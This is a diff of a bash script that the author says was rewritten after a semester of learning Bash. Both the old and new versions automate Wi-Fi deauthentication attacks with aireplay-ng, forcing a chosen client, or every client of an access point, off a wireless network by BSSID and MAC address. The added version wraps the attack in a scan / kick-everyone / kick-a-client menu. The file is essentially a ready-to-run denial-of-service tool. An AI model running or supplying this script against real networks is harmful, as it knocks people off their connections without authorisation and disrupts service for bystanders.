@@ -1,26 +1,39 @@
 #!/bin/bash
-#Kick any device from any wi-fi network
-#This script only works (properly) under the latest Kali Linux (it might also work under backtrack so please test)
-clear #clears the screen
-ifconfig #show all connected interfaces
-echo "What's the name (on the left) of your wireless card interface?"
-read -e IF #waits for user input for the name of the wirelss interface
-echo "Which channel would you like the monitoring device to be on?" #At this point, open a new terminal window and type "airodump-ng [interface]" to see all the networks around you with the channels
-read -e CH #wait for user input on the channel number
-echo "stopping mon0"
-airmon-ng stop mon0 > /dev/null #stop mon0 and don't show output of command to keep things clean
-echo "stopping $IF"
-airmon-ng stop $IF > /dev/null #stops the wireless interface
-echo "starting $IF on channel $CH"
-airmon-ng start $IF $CH > /dev/null #starts wireless interface on specified channel number
-clear #clear the screen
-echo "Please specify the AP's SSID/name"
-read -e AP
-echo "Please input the MAC address you'd like to kick"
-read -e MAC
-echo "How many times would you like to kick $MAC? (0= infinate - stop with ctrl+c)"
-read -e KICK
-echo "Kicking $MAC from $AP $KICK time(s)"
-echo "NOTE if 0 was used, you must issue ctrl+c to break the opperation/stop kicking"
-aireplay-ng wlan0 -e $AP --deauth $KICK -c $MAC >/dev/null
-exit 1
+
+# This script will allow you to kick a device or an entire network from
+# the BSSID of your choice
+# This script was re-written from the ground up based on things I've learned
+# in Bash from the past semester at college
+# You must make sure your card is in monitor mode first by typing
+# airmon-ng start wlan0
+
+
+echo "Please enter one of the three options:"
+echo "1) Scan"
+echo "2) Kick everyone"
+echo "3) Kick a client"
+
+read -p "Now a number?: " menu
+
+if [ $menu == "1" ] ; then
+echo "When you are finished scanning for wifi press ctrl+c"
+sleep 1s
+echo "Scan will start in 5 seconds..."
+sleep 5s
+airodump-ng mon0
+	if [ $? != "0" ] ; then
+		echo "OH NO something went wrong. Please make sure your card is in monitor mode and try again."
+	exit 1
+	fi
+fi
+
+if [ $menu == "2" ] ; then
+	read -p "BSSID please in AA:BB;CC:DD:EE:FF format: " bssid
+	aireplay-ng mon0 -a $bssid --deauth 5 --ignore-negative-one
+fi
+
+if [ $menu == "3" ] ; then
+	read -p "BSSID please in AA:BB:CC:DD:EE:FF format: " bssid
+	read -p "Client MAC in AA:BB:CC:DD:EE:FF format : " client
+	aireplay-ng mon0 -a $bssid -c $client --deauth 5 --ignore-negative-one
+fi
